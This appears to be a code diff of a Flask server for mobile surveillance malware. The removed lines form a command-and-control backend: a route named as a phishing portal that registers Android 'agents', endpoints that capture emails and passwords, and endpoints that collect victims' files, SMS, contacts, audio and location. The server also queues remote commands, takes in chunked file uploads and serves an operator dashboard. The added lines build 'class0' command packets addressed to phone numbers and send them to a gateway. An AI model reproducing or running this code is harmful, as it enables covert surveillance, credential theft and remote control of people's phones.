-def commander_dashboard():
-    if not session.get('authenticated'): return redirect(url_for('commander_login'))
-    return HTML_COMMAND_CENTER
-
-@app.route('/commander/logout', methods=['GET'])
-def commander_logout():
-    session.pop('authenticated', None)
-    return redirect(url_for('commander_login'))
-
-@app.route('/auth/verify/login', methods=['POST'])
-def phishing_portal():
-    req_data = request.get_json(silent=True) or {}
-    token = req_data.get('session_token', 'agent_target')
-    AGENT_SESSIONS[token] = {
-        "agent": f"{req_data.get('user_agent', 'Android')[:25]}",
-        "token": token,
-        "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
-        "platform": req_data.get('platform', 'Android Target'),
-        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    }
-    if token not in COMMAND_QUEUES: COMMAND_QUEUES[token] = []
-    return jsonify({"status": "agent_active", "token": token})
-
-@app.route('/api/credentials', methods=['POST'])
-def capture_credentials():
-    req_data = request.get_json(silent=True) or {}
-    CAPTURED_CREDENTIALS.append({
-        "token": req_data.get('token', 'N/A'), "email": req_data.get('email', 'N/A'),
-        "password": req_data.get('password', 'N/A'), "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    })
-    return jsonify({"status": "secured"})
-
-@app.route('/api/report_files', methods=['POST'])
-def report_files():
-    req_data = request.get_json(silent=True) or {}
-    token = req_data.get('token', 'N/A')
-    if 'files' in req_data: TARGET_FILE_INDEX[token] = req_data.get('files', [])
-    if 'images' in req_data: TARGET_IMAGE_INDEX[token] = req_data.get('images', [])
-    if 'audio' in req_data: TARGET_AUDIO_INDEX[token] = req_data.get('audio', [])
-    if 'sms' in req_data: TARGET_SMS_INDEX[token] = req_data.get('sms', [])
-    if 'contacts' in req_data: TARGET_CONTACTS_INDEX[token] = req_data.get('contacts', [])
-    if 'location' in req_data: TARGET_LOCATION_INDEX[token] = req_data.get('location', [])
-    return jsonify({"status": "indexed"})
-
-@app.route('/api/queue_command', methods=['POST'])
-def queue_command():
-    req_data = request.get_json(silent=True) or {}
-    token = req_data.get('token')
-    if token and token in COMMAND_QUEUES: 
-        COMMAND_QUEUES[token].append(req_data)
-    elif token:
-        COMMAND_QUEUES[token] = [req_data]
-    return jsonify({"status": "queued"})
-
-@app.route('/api/poll_commands', methods=['POST'])
-def poll_commands():
-    req_data = request.get_json(silent=True) or {}
-    token = req_data.get('token')
-    cmds = []
-    if token in COMMAND_QUEUES and COMMAND_QUEUES[token]:
-        cmds = COMMAND_QUEUES[token]
-        COMMAND_QUEUES[token] = []
-    return jsonify({"commands": cmds})
-
-@app.route('/api/report_execution', methods=['POST'])
-def report_execution():
-    req_data = request.get_json(silent=True) or {}
-    EXECUTION_LOGS.append({
-        "token": req_data.get('token', 'N/A'),
-        "action": req_data.get('action', 'N/A'),
-        "status": req_data.get('status', 'executed'),
-        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    })
-    return jsonify({"status": "logged"})
-
-@app.route('/api/upload_real_file_chunk', methods=['POST'])
-def upload_real_file_chunk():
-    req_data = request.get_json(silent=True) or {}
-    token = req_data.get('token', 'N/A')
-    filename = req_data.get('filename', 'file.bin')
-    chunk_index = req_data.get('chunk_index', 0)
-    total_chunks = req_data.get('total_chunks', 1)
-    chunk_b64 = req_data.get('data', '')
-    
-    key = f"{token}_{filename}"
-    if key not in CHUNKED_STORAGE:
-        CHUNKED_STORAGE[key] = {"total": total_chunks, "parts": {}}
-    
+    data = request.get_json(silent=True) or {}
+    payload_text = compose_command_payload(
+        str(data.get("cmd_name", "PING")),
+        str(data.get("cmd_args", "")),
+        str(data.get("note_text", "")),
+    )
     try:
-        CHUNKED_STORAGE[key]["parts"][chunk_index] = base64.b64decode(chunk_b64)
-        if len(CHUNKED_STORAGE[key]["parts"]) == total_chunks:
-            full_bytes = b""
-            for i in range(total_chunks):
-                full_bytes += CHUNKED_STORAGE[key]["parts"][i]
-            
-            saved_name = f"{token}_{filename.replace('/', '_').replace('(', '').replace(')', '')}"
-            filepath = os.path.join(UPLOAD_FOLDER, saved_name)
-            with open(filepath, "wb") as f: f.write(full_bytes)
-            
-            EXTRACTED_ALL_FILES.append({
-                "token": token, "filename": filename, "saved_name": saved_name,
-                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            })
-            del CHUNKED_STORAGE[key]
-            return jsonify({"status": "completed"})
-        return jsonify({"status": "chunk_received"})
-    except Exception as e: return jsonify({"status": "error", "message": str(e)}), 400
+        pkt = build_class0_command_packet(
+            str(data.get("phone", "")),
+            payload_text,
+            str(data.get("encoding", "auto")),
+        )
+    except ValueError as exc:
+        return jsonify({"error": str(exc)}), 400
 
-@app.route('/download/<path:filename>', methods=['GET'])
-def download_file(filename):
-    if not session.get('authenticated'): return "Unauthorized", 401
-    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)
+    pkt_id = hashlib.sha256(
+        f"{datetime.datetime.now(datetime.timezone.utc).isoformat()}-{len(PACKETS_STORE)}".encode()
+    ).hexdigest()[:12]
 
-@app.route('/api/index', methods=['POST'])
-def api_index():
-    if not session.get('authenticated'): return jsonify({"error": "Unauthorized"}), 401
-    req_data = request.get_json(silent=True) or {}
-    mode = req_data.get("command", "")
-    if mode == "fetch_active_agents": return jsonify({"agents": list(AGENT_SESSIONS.values())})
-    elif mode == "fetch_captured_credentials": return jsonify({"credentials": CAPTURED_CREDENTIALS})
-    elif mode == "fetch_target_file_list":
-        flat = []
-        for tkn, lst in TARGET_FILE_INDEX.items():
-            for f in lst: flat.append({"token": tkn, "filename": f})
-        return jsonify({"files": flat})
-    elif mode == "fetch_target_image_list":
-        flat_img = []
-        for tkn, lst in TARGET_IMAGE_INDEX.items():
-            for im in lst: flat_img.append({"token": tkn, "filename": im})
-        return jsonify({"images": flat_img})
-    elif mode == "fetch_target_audio_list":
-        flat_aud = []
-        for tkn, lst in TARGET_AUDIO_INDEX.items():
-            for au in lst: flat_aud.append({"token": tkn, "filename": au})
-        return jsonify({"audio": flat_aud})
-    elif mode == "fetch_target_sms_list":
-        flat_sms = []
-        for tkn, lst in TARGET_SMS_INDEX.items():
-            for s in lst: flat_sms.append({"token": tkn, "body": s, "time": datetime.datetime.now().strftime("%H:%M:%S")})
-        return jsonify({"sms": flat_sms})
-    elif mode == "fetch_target_contacts_list":
-        flat_cnt = []
-        for tkn, lst in TARGET_CONTACTS_INDEX.items():
-            for c in lst: flat_cnt.append({"token": tkn, "name": c.get("name", ""), "phone": c.get("phone", "")})
-        return jsonify({"contacts": flat_cnt})
-    elif mode == "fetch_target_location":
-        flat_loc = []
-        for tkn, lst in TARGET_LOCATION_INDEX.items():
-            for l in lst: flat_loc.append({"token": tkn, "lat": l.get("lat"), "lng": l.get("lng"), "time": l.get("time")})
-        return jsonify({"locations": flat_loc})
-    elif mode == "fetch_extracted_files": return jsonify({"extracted": EXTRACTED_ALL_FILES})
-    elif mode == "fetch_execution_logs": return jsonify({"logs": EXECUTION_LOGS})
-    return jsonify({"status": "ok"})
+    record = {
+        "id": pkt_id,
+        "time": datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
+        **pkt,
+    }
+    PACKETS_STORE.append(record)
+    return jsonify({k: v for k, v in record.items() if k != "raw"})
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+
+@app.route("/download_cmd_pdu/<pkt_id>", methods=["GET"])
+def download_cmd_pdu(pkt_id: str):
+    pkt = find_packet(pkt_id)
+    if not pkt:
+        return "Not found", 404
+    return Response(
+        pkt["raw"],
+        mimetype="application/octet-stream",
+        headers={"Content-Disposition": f"attachment; filename=pdu_{pkt['id']}.bin"},
+    )
+
+
+@app.route("/api/dispatch_cmd_pdu", methods=["POST"])
+def api_dispatch_cmd_pdu():
+    if not is_authorized(request):
+        return jsonify({"error": "صلاحية الوصول غير صحيحة."}), 401
+
+    data = request.get_json(silent=True) or {}
+    pkt_id = str(data.get("id", "")).strip()
+    endpoint = str(data.get("endpoint", "")).strip()
+
+    pkt = find_packet(pkt_id)
+    if not pkt:
+        return jsonify({"error": "الحزمة غير موجودة."}), 404
+
+    if not endpoint:
+        return jsonify({"message": "الحزمة جاهزة للتنزيل أو النسخ؛ أدخل رابط بوابة لاختبار الإرسال."})
+
+    safe, reason = is_safe_endpoint(endpoint)
+    if not safe:
+        return jsonify({"error": reason}), 400
+
+    try:
+        req = url_request.Request(
+            endpoint,
+            data=pkt["raw"],
+            headers={
+                "Content-Type": "application/octet-stream",
+                "X-Target-Phone": pkt["phone"],
+            },
+            method="POST",
+        )
+        with url_request.urlopen(req, timeout=8) as resp:
+            return jsonify({"message": f"تم الإرسال إلى البوابة (HTTP {resp.status})."})
+    except Exception as exc:
+        return jsonify({"error": f"تعذر الاتصال بالبوابة: {exc}"}), 502
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
